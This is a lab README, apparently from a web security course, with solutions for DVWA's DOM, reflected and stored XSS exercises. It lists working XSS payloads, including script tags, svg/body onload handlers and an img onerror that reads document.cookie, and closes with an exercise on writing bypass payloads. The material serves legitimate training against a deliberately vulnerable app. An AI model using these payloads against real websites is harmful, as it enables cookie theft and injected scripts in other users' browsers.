

### INT307 Web Application Security Lab 2: XSS Vulnerabilities in DVWA

### Introduction

This lab repository contains comprehensive exercises and solutions for addressing Cross-Site Scripting (XSS) vulnerabilities in the Damn Vulnerable Web Application (DVWA). Designed for security professionals and enthusiasts, this lab offers hands-on experience in identifying and mitigating XSS vulnerabilities.


Through various exercises, participants will engage with different XSS attack vectors, allowing them to strengthen their web security skills in a controlled and legal environment.

### Overview

The Damn Vulnerable Web Application (DVWA) is a popular web application designed for security professionals and enthusiasts to practice their web security skills in a legal and safe environment. This repository focuses on addressing and mitigating XSS vulnerabilities, one of the most common and critical web security issues.

![image](https://github.com/kashrathod19/XSS-DVWA-SOLUTION/assets/54115061/949deaaa-2f13-4bb8-b2fd-6dfe8af11e02)

---

## XSS (DOM)

A DOM-based cross-site scripting (XSS) attack happens when a threat actor modifies the document object model (DOM) environment in the victim's browser. So, while the HTML itself doesn't change, the code on the client side executes differently.

### Low

**Payload:** 
```html
<script>alert('BugBot19 was here')</script>
```

![image](https://github.com/kashrathod19/XSS-DVWA-SOLUTION/assets/54115061/b2e8392c-5c65-4d06-ab00-6385f0afbc15)

### Medium

**Payload:** 
```html
<script>alert('BugBot19 was here')</script>
```

![image](https://github.com/kashrathod19/XSS-DVWA-SOLUTION/assets/54115061/6ed8d892-dd6d-4fc5-81b6-929d7cddedd4)

### High

**Payload:** 
```html
<script>alert('BugBot19 was here')</script>
```

![image](https://github.com/kashrathod19/XSS-DVWA-SOLUTION/assets/54115061/0f06a1ce-092b-48bf-b5e8-dc4a36f151f3)

---

## XSS (Reflected)

Reflected XSS is a kind of cross-site scripting attack, where a malicious script is injected into websites that are trusted or otherwise benign. Typically, the injection occurs when an unsuspecting user clicks on a link that is specifically designed to attack the website they are visiting.

### Low/Medium/High

During the research phase, I found out that one of the payloads can be used in all three levels. The payload is mentioned below:

**Payload:** 
```html
<svg onload=alert('BugBot19 was here')>
```

![image](https://github.com/kashrathod19/XSS-DVWA-SOLUTION/assets/54115061/ec196e0c-8285-4971-a7c4-89ac9ce4bb1f)

---

## XSS (Stored)

Stored XSS, also known as persistent XSS, is the more damaging of the two. It occurs when a malicious script is injected directly into a vulnerable web application. Reflected XSS involves reflecting a malicious script off of a web application onto a user's browser.

### Low

**Payload:** 
```html
<script>alert(document.domain)</script>
```

![image](https://github.com/kashrathod19/XSS-DVWA-SOLUTION/assets/54115061/c91a9a4f-08c1-4a1e-8d05-a6c1fc3806a4)

### Medium

**Payload:** 
```html
<img src=x onerror=alert(document.cookie)>
```

**Change the text 'size' and 'max length'.**

![image](https://github.com/kashrathod19/XSS-DVWA-SOLUTION/assets/54115061/a2325489-0375-460d-8087-eadcc9afefc5)

### High

**Payload:** 
```html
<body onload=alert('BugBot19')>
```

**Change the text 'size' and 'max length'.**

![image](https://github.com/kashrathod19/XSS-DVWA-SOLUTION/assets/54115061/f2ce8a4a-16ae-4ddd-b177-7c2912ee58f9)

---

## Exercise: XSS Vulnerability Assessment

### Objective

In this exercise, you will perform a series of tasks to identify and exploit XSS vulnerabilities within the DVWA environment. 

### Instructions

1. **Setup DVWA**: Ensure that DVWA is set up and running on your local environment. Access it through your web browser.
  
2. **Identify Vulnerable Input Fields**:
   - Explore different sections of DVWA (e.g., "XSS (Reflected)", "XSS (Stored)", "XSS (DOM)").
   - Identify input fields that are vulnerable to XSS attacks.

3. **Test with Low-Level Payloads**:
   - Use the low-level payload provided above for DOM-based XSS.
   - Confirm if you receive the expected alert pop-up.

4. **Experiment with Medium-Level Payloads**:
   - Enter the medium-level payload for reflected XSS and observe the behavior of the application.
   - Document your findings and any variations in output.

5. **Explore High-Level Payloads**:
   - Implement high-level payloads in the respective fields and observe the results.
   - Note down any unexpected behaviors or security measures taken by DVWA.

6. **Create Your Own Payloads**:
   - Develop additional payloads that you believe may bypass the security measures in place.
   - Test these payloads and analyze the results.

7. **Report Findings**:
   - Write a short report detailing the input fields tested, payloads used, results obtained, and any mitigation strategies you propose.

### Conclusion

In this lab, you have learned how to identify and exploit XSS vulnerabilities in the DVWA application. Understanding these vulnerabilities and how to exploit them is crucial for enhancing web application security.

--- 
